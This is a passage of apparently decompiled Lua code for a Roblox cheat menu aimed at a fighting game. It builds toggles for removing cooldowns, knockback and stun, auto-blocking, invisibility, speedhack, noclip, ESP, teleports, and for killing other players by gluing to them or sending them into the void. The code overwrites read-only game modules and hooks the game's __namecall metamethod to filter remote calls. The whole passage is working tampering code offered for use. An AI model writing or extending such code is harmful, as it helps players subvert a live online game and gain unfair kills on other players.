        Resizable = true,
        SideBarWidth = 200,
        BackgroundImageTransparency = 0.42,
        HideSearchBar = true,
        ScrollBarEnabled = false,
        User = {
            Enabled = true,
            Anonymous = true,
            Callback = function()
            end
        }
    })

    v394:Tag({
        Title = "JSD",
        Color = Color3.fromHex("#30ff6a")
    })

    local v395 = v394:Tab({ Title = "Combat" })
    local v396 = v394:Tab({ Title = "Player" })
    local v397 = v394:Tab({ Title = "Movement & TP" })
    local v398 = v394:Tab({ Title = "Misc" })
    local v399 = v394:Tab({ Title = "Info" })
    local v400 = v394:Tab({ Title = "Suggestions" })

    v395:Toggle({
        Title = "No Dash Cooldowns",
        Desc = "Works on Front&Back, Side, Ragdoll cancel/Evasive, Wallcombos",
        Default = false,
        Callback = function(p401)
            local v402 = require(game:GetService("ReplicatedStorage").Modules.Player.Character.Combat)
            setreadonly(v402, false)
            if not v402._OriginalAddCooldown then
                v402._OriginalAddCooldown = v402.AddCooldown
            end
            if p401 then
                function v402.AddCooldown()
                end
            else
                v402.AddCooldown = v402._OriginalAddCooldown
            end
        end
    })

    v395:Toggle({
        Title = "No wall run Cooldowns",
        Desc = "",
        Default = false,
        Callback = function(p403)
            if p403 then
                setreadonly(vu353, false)
                function vu353.CanActivate()
                    return true
                end
            else
                vu353.CanActivate = vu354
                setreadonly(vu353, true)
            end
        end
    })

    v395:Section({ Title = "Op" })

    v395:Toggle({
        Title = "No attack (block all attacks)",
        Desc = "blocks all AttackInput FireServer calls",
        Default = false,
        Callback = function(p)
            if p then
                noattack()
            else
                attack()
            end
        end
    })

    v395:Toggle({
        Title = "Wall combo anywhere",
        Desc = "Let's you do a wall combo without having to be in front of a wall",
        Default = false,
        Callback = function(p404)
            vu63 = p404
        end
    })

    v395:Toggle({
        Title = "Auto void kill",
        Desc = "teleports people to the void when using the supported moves",
        Default = false,
        Callback = function(p405)
            _G.teleportSystemEnabled = p405
        end
    })

    v395:Toggle({
        Title = "No knockback",
        Desc = "wont get knocked back/velocity from anything",
        Default = false,
        Callback = function(p406)
            setreadonly(vu351, false)
            if p406 then
                function vu351.Velocity()
                end
            else
                vu351.Velocity = vu352
            end
            setreadonly(vu351, true)
        end
    })

    v395:Toggle({
        Title = "Auto complete chara timing",
        Desc = "gives you the extra damage for charas 4th move even if u fail the timing",
        Default = false,
        Callback = function(p407)
            charaminigaming = p407
        end
    })

    v395:Toggle({
        Title = "Auto win Chara 3rd move",
        Desc = "automatically wins the Chara 3rd move minigame",
        Default = false,
        Callback = function(p)
            autoWinChara3 = p
        end
    })

    v395:Toggle({
        Title = "Auto godlike clash",
        Desc = "instantly wins clash with max presses",
        Default = false,
        Callback = function(p)
            autoGodlikeClash = p
        end
    })

    local antiStunActive = false
    local v410 = game:GetService("Players").LocalPlayer.PlayerGui.StatesHolder.States
    local antiStunInterval = 0
    v48.Heartbeat:Connect(function(dt)
        antiStunInterval = antiStunInterval + dt
        if antiStunInterval >= 0.1 then
            antiStunInterval = 0
            if antiStunActive then
                v410:SetAttribute("Stunned", false)
            end
        end
    end)

    v397:Toggle({
        Title = "Anti M1's",
        Desc = "Let's you side dash out of M1's/punches and moves that dont grab",
        Default = false,
        Callback = function(p408)
            antiStunActive = p408
        end
    })

    v397:Toggle({
        Title = "Anti ragdoll",
        Desc = "lets you move while ragdolled (reworked)",
        Default = false,
        Callback = function(p409)
            setreadonly(vu349, false)
            if p409 then
                function vu349.ToggleRagdollStates()
                end
            else
                vu349.ToggleRagdollStates = vu350
            end
            setreadonly(vu349, true)
        end
    })

    v395:Section({ Title = "Lock on" })

    local v411 = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
    local v412 = Instance.new("ScreenGui")
    v412.Name = "SpeedhackDraggableGui"
    v412.ResetOnSpawn = false
    v412.Parent = v411
    local vu413 = Instance.new("TextButton")
    vu413.Name = "DraggableButton"
    vu413.Draggable = true
    vu413.Visible = false
    vu413.Text = "Lock on"
    vu413.Size = UDim2.new(0, 80, 0, 40)
    vu413.Position = UDim2.new(0.5, -40, 0.1, 0)
    vu413.BackgroundColor3 = Color3.fromRGB(44, 155, 230)
    vu413.TextColor3 = Color3.fromRGB(255, 255, 255)
    vu413.Font = Enum.Font.SourceSansBold
    vu413.TextSize = 18
    vu413.Parent = v412
    local v414 = Instance.new("UICorner")
    v414.CornerRadius = UDim.new(0, 8)
    v414.Parent = vu413
    vu413.MouseButton1Click:Connect(function()
        lockOnEnabled = not lockOnEnabled
    end)
    local function vu416(p415)
        vu413.Visible = p415
    end

    v395:Toggle({
        Title = "Lock on",
        Desc = "turn off shiftlock",
        Default = false,
        Callback = function(p417)
            lockOnEnabled = p417
            vu416(p417)
        end
    })

    v395:Slider({
        Title = "Smoothness",
        Step = 0.001,
        Value = { Min = 0.001, Max = 1, Default = 0.15 },
        Callback = function(p418)
            smoothness = p418
        end
    })

    v395:Section({ Title = "block" })

    v395:Toggle({
        Title = "Auto perfect block",
        Desc = "blocks m1's for you and black flashes",
        Default = false,
        Callback = function(p419)
            vu202 = p419
        end
    })

    v395:Slider({
        Title = "Delay",
        Step = 0.001,
        Value = { Min = 0.004, Max = 0.5, Default = 0.1 },
        Callback = function(p420)
            vu240 = p420
        end
    })

    v395:Slider({
        Title = "Max range",
        Step = 1,
        Value = { Min = 10, Max = 50, Default = 20 },
        Callback = function(p421)
            vu201 = p421
        end
    })

    v396:Toggle({
        Title = "Invisibility",
        Desc = "Makes you invis (server sided)",
        Default = false,
        Callback = function(p422)
            vu382 = p422
            local v423 = game.Players.LocalPlayer.Character
            if v423 then
                vu385()
                vu386(v423)
            end
        end
    })

    v396:Toggle({
        Title = "Glue",
        Desc = "Glues you behind to the selected player",
        Default = false,
        Callback = function(p424)
            vu198 = p424
        end
    })

    v396:Input({
        Title = "glue to",
        Desc = "players display or user..",
        Value = "",
        Placeholder = "",
        Callback = function(p425)
            vu197 = p425
        end
    })

    v396:Toggle({
        Title = "Fast kill (use with glue)",
        Desc = "",
        Default = false,
        Callback = function(p426)
            vu196 = p426
            if vu196 then
                task.spawn(fastkill)
            end
        end
    })

    v396:Toggle({
        Title = "Glue to chara",
        Desc = "",
        Default = false,
        Callback = function(p427)
            vu195 = p427
        end
    })

    local vu428 = game:GetService("Players").LocalPlayer
    local vu429 = nil
    vu428.CharacterAdded:Connect(function()
        vu429 = vu428:WaitForChild("Remotes"):WaitForChild("Combat"):WaitForChild("AttackInput")
    end)
    local v430 = vu428
    local vu431 = vu428.WaitForChild(v430, "Remotes"):WaitForChild("Combat"):WaitForChild("AttackInput")
    local vu432 = false
    local v433 = getrawmetatable(game)
    setreadonly(v433, false)
    local vu434 = v433.__namecall
    function v433.__namecall(p435, ...)
        local v436 = getnamecallmethod()
        local v437 = { ... }
        if vu432 and (p435 == vu431 and (v436 == "FireServer" and (v437[1] == "M1" and v437[2] == false))) then
            return nil
        else
            return vu434(p435, ...)
        end
    end
    local v438 = vu428
    vu429 = vu428.WaitForChild(v438, "Remotes"):WaitForChild("Combat"):WaitForChild("AttackInput")

    local vu439 = {
        "M1", "Onslaught", "Lethal Wound", "Ruthless Beatdown", "Lapse Pull", "Sweep",
        "Palm Strikes", "Bio Electric Burst", "Soundwave Punch", "Tectonic Control",
        "Accelerated Punishment", "SELF DEFENSE RUSH!!!", "SALT PUAAANNCH",
        "GET A JOB YOU BUM!!!", "GO GREEN BLOB!", "Chaos Barrage", "Leviathan Rush",
        "Leviathan Throw", "Draupnir Spin", "Possession Flurry", "Wailing Fang",
        "Crypt Cutter", "Evil Spirit"
    }

    v396:Toggle({
        Title = "Auto farm Chara",
        Desc = "",
        Default = false,
        Callback = function(pu440)
            vu195 = pu440
            if pu440 then
                vu432 = true
                for _, v444 in ipairs(vu439) do
                    vu429:FireServer(v444, true)
                end
                game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(_)
                    if pu440 then
                        for _, v448 in ipairs(vu439) do
                            vu429:FireServer(v448, true)
                        end
                    end
                end)
            else
                vu432 = false
                for _, v452 in ipairs(vu439) do
                    vu429:FireServer(v452, false)
                end
            end
        end
    })

    local v453 = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
    local v454 = Instance.new("ScreenGui")
    v454.Name = "SpeedhackDraggableGui"
    v454.ResetOnSpawn = false
    v454.Parent = v453
    local vu455 = Instance.new("TextButton")
    vu455.Name = "DraggableButton"
    vu455.Draggable = true
    vu455.Visible = false
    vu455.Text = "Speed"
    vu455.Size = UDim2.new(0, 80, 0, 40)
    vu455.Position = UDim2.new(0.5, -40, 0.1, 0)
    vu455.BackgroundColor3 = Color3.fromRGB(150, 80, 80)
    vu455.TextColor3 = Color3.fromRGB(255, 255, 255)
    vu455.Font = Enum.Font.SourceSansBold
    vu455.TextSize = 18
    vu455.Parent = v454
    local v456 = Instance.new("UICorner")
    v456.CornerRadius = UDim.new(0, 8)
    v456.Parent = vu455
    vu455.MouseButton1Click:Connect(function()
        vu151 = not vu151
    end)
    local function vu458(p457)
        vu455.Visible = p457
    end

    v397:Toggle({
        Title = "Speedhack",
        Desc = "run fast",
        Default = false,
        Callback = function(p459)
            vu150 = p459
            vu458(p459)
        end
    })

    v397:Slider({
        Title = "speed",
        Step = 5,
        Value = { Min = 0, Max = 1000, Default = 50 },
        Callback = function(p460)
            vu152 = p460
        end
    })

    v397:Section({ Title = "Tp's" })

    local v461 = {
        "Middle", "Mountains", "Inside Castle", "invisible thing", "Chara area",
        "Above Chara area", "Edge", "Prison", "Water thing", "Soccer field",
        "Pillar", "Above Cabin", "Cave", "Above Cave", "New place", "Cabin",
        "Invincible desert", "Mob map", "Mob map sewer"
    }

    v397:Dropdown({
        Title = "Tp to area",
        Values = v461,
        Value = v461[1],
        Multi = false,
        Callback = function(p462)
            if p462 == "Middle" then
                vu280 = CFrame.new(269.842987, 5.45333672, 362.904785, 0.115370512, -2.61038728e-8, 0.993322551, 6.27933474e-8, 1, 1.89861531e-8, -0.993322551, 6.01836021e-8, 0.115370512)
            elseif p462 == "Mountains" then
                vu280 = CFrame.new(-215.243103, 243.081726, 85.0237579, 0.132866964, -2.41381741e-8, -0.991133869, -1.31960398e-8, 1, -2.61231019e-8, 0.991133869, 1.65499401e-8, 0.132866964)
            elseif p462 == "Chara area" then
                vu280 = CFrame.new(-371.342072, 5.56633282, 93.5839081, -0.866185129, 8.18949264e-9, 0.499723256, -2.32883668e-8, 1, -5.67544731e-8, -0.499723256, -6.07976176e-8, -0.866185129)
            elseif p462 == "Above Chara area" then
                vu280 = CFrame.new(-474.638, 134.109741, 121.629463, 0.421889812, 7.10480919e-8, -0.906647086, 1.92542373e-8, 1, 8.7323123e-8, 0.906647086, -5.42975371e-8, 0.421889812)
            elseif p462 == "Cave" then
                vu280 = CFrame.new(237.28244, 7.34690762, -771.277161, 0.991938174, 1.91424103e-8, 0.126722977, -2.86298238e-8, 1, 7.30459817e-8, -0.126722977, -7.60851506e-8, 0.991938174)
            elseif p462 == "Above Cave" then
                vu280 = CFrame.new(411.391907, 137.346863, -776.864868, 0.212231457, -9.92231222e-8, -0.977219403, -2.07310844e-8, 1, -1.06038527e-7, 0.977219403, 4.27635314e-8, 0.212231457)
            elseif p462 == "New place" then
                vu280 = CFrame.new(972.954895, 4.59052467, 25.9301949, -0.837864459, 2.75072178e-8, 0.545878351, 1.1863678e-8, 1, -3.21812799e-8, -0.545878351, -2.04874251e-8, -0.837864459)
            elseif p462 == "Invincible desert" then
                vu280 = CFrame.new(82.2127533, 66.270752, -20001.6797, -0.20519121, 1.05746842e-7, 0.978721917, -2.59120192e-9, 1, -1.08589106e-7, -0.978721917, -2.48175951e-8, -0.20519121)
            elseif p462 == "Mob map" then
                vu280 = CFrame.new(42.7815666, 78.5011292, 19933.9062, 0.828718901, 2.42312819e-8, -0.559665024, 3.38124728e-8, 1, 9.33635533e-8, 0.559665024, -9.62958069e-8, 0.828718901)
            elseif p462 == "Mob map sewer" then
                vu280 = CFrame.new(9.91348457, -41.184433, 19980.9375, 0.328368217, 5.65654652e-8, 0.944549799, -9.28720993e-8, 1, -2.75996239e-8, -0.944549799, -7.86594825e-8, 0.328368217)
            elseif p462 == "Cabin" then
                vu280 = CFrame.new(-224.669281, 4.86968803, -511.644043, 0.0669663101, -1.88245171e-8, 0.997755229, 7.59259606e-8, 1, 1.3770947e-8, -0.997755229, 7.48333377e-8, 0.0669663101)
            elseif p462 == "Inside Castle" then
                vu280 = CFrame.new(-139.925354, 121.144653, 300.046722, 0.997429967, -6.84877861e-8, -0.0716481656, 7.30594039e-8, 1, 6.11858511e-8, 0.0716481656, -6.62631692e-8, 0.997429967)
            elseif p462 == "Edge" then
                vu280 = CFrame.new(-635.889038, 5.26023006, -330.119904, -0.00800123438, 2.88153252e-8, 0.999967992, 1.55051776e-8, 1, -2.86921829e-8, -0.999967992, 1.52751074e-8, -0.00800123438)
            elseif p462 == "Prison" then
                vu280 = CFrame.new(-396.958679, 5.26023006, -257.987274, 0.924525082, -1.87899007e-9, -0.381121159, 2.59864237e-8, 1, 5.81077977e-8, 0.381121159, -6.36260964e-8, 0.924525082)
            elseif p462 == "Water thing" then
                vu280 = CFrame.new(139.993988, 39.4093323, -583.447388, -0.998085976, 1.32675339e-7, 0.06184192, 1.30071072e-7, 1, -4.61374192e-8, -0.06184192, -3.80052647e-8, -0.998085976)
            elseif p462 == "Soccer field" then
                vu280 = CFrame.new(631.415649, 4.14904785, -520.783691, -0.0635834485, 3.29991146e-8, -0.997976542, -2.20027339e-8, 1, 3.44678703e-8, 0.997976542, 2.41497986e-8, -0.0635834485)
            elseif p462 == "Pillar" then
                vu280 = CFrame.new(333.147278, 54.094162, 290.76944, -0.9164294, -1.88291001e-8, 0.400196463, -6.64589095e-9, 1, 3.18308935e-8, -0.400196463, 2.65111044e-8, -0.9164294)
            elseif p462 == "Above Cabin" then
                vu280 = CFrame.new(-227.760208, 37.7323685, -522.236816, -0.993760526, -3.40358275e-9, -0.111534767, -1.10498579e-8, 1, 6.79369307e-8, 0.111534767, 6.87454857e-8, -0.993760526)
            elseif p462 == "invisible thing" then
                vu280 = CFrame.new(-210.353607, 538.881775, -31.9519329, 0.295826554, -2.55365293e-8, 0.95524168, -4.31837544e-9, 1, 2.80704047e-8, -0.95524168, -1.24290631e-8, 0.295826554)
            end
        end
    })

    v397:Button({
        Title = "tp",
        Desc = "",
        Callback = function()
            if vu359 then
                vu359.CFrame = vu280
            end
        end
    })

    v397:Button({
        Title = "Tp to Chara",
        Desc = "",
        Callback = function()
            vu125()
        end
    })

    v397:Button({
        Title = "Tp to invincible portal",
        Desc = "",
        Callback = function()
            local v463 = workspace:WaitForChild("Visuals"):WaitForChild("Portal")
            local v464 = game.Players.LocalPlayer;
            (v464.Character or v464.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart").CFrame = v463.CFrame
        end
    })

    v397:Button({
        Title = "tp to items",
        Desc = "",
        Callback = function()
            tptoitem()
        end
    })

    v398:Dropdown({
        Title = "Emotes",
        Desc = "",
        Values = v5,
        Value = v5[1],
        Multi = false,
        Callback = function(p465)
            local v466 = vu6[p465]
            if v466 then
                local v467 = vu55.Humanoid:WaitForChild("Animator")
                if vu384 then
                    vu384:Stop()
                    vu384 = nil
                end
                vu384 = v467:LoadAnimation(v466)
            end
        end
    })

    v398:Button({
        Title = "Play emote",
        Desc = "",
        Callback = function()
            if vu384 then
                vu384:Play()
            end
        end
    })

    v398:Button({
        Title = "Stop emote",
        Desc = "",
        Callback = function()
            if vu384 then
                vu384:Stop()
                vu384 = nil
            end
        end
    })

    v398:Section({ Title = "misc" })

    v398:Toggle({
        Title = "no clip",
        Desc = "go through walls",
        Default = false,
        Callback = function(p468)
            vu194 = p468
            if vu194 then
                startNoclip()
            else
                stopNoclip()
            end
        end
    })

    v398:Section({ Title = "more misc" })

    v398:Toggle({
        Title = "esp",
        Desc = "",
        Default = false,
        Callback = function(p469)
            vu383 = p469
        end
    })

    v398:Section({ Title = "" })

    v398:Button({
        Title = "rejoin server",
        Desc = "",
        Callback = function()
            local v470 = game:GetService("TeleportService")
            local v471 = game:GetService("Players").LocalPlayer
            local v472 = game.PlaceId
            local v473 = game.JobId
            task.wait()
            v470:TeleportToPlaceInstance(v472, v473, v471)
        end
    })

    v399:Paragraph({
        Title = "Changelog",
        Desc = "[+] Fixed script not working when not fully loaded in\n[+] Added healthbar to esp"
    })

    v399:Paragraph({
        Title = "Auto void kill supported moves",
        Desc = "Gojo\n 1st move, 3rd move,  4th move\nEsper\n1st move, 3rd move, 4th move, wall combo\nReigen\n 3rd move\nKratos\n 2nd move (beatdown)\nChara\n all moves(1st move variant)"
    })

    v400:Input({
        Title = "Suggestions",
        Desc = "what should i add",
        Value = "",
        Placeholder = "...",
        Callback = function(p474)
            sendToDiscord(p474)
        end
    })
end
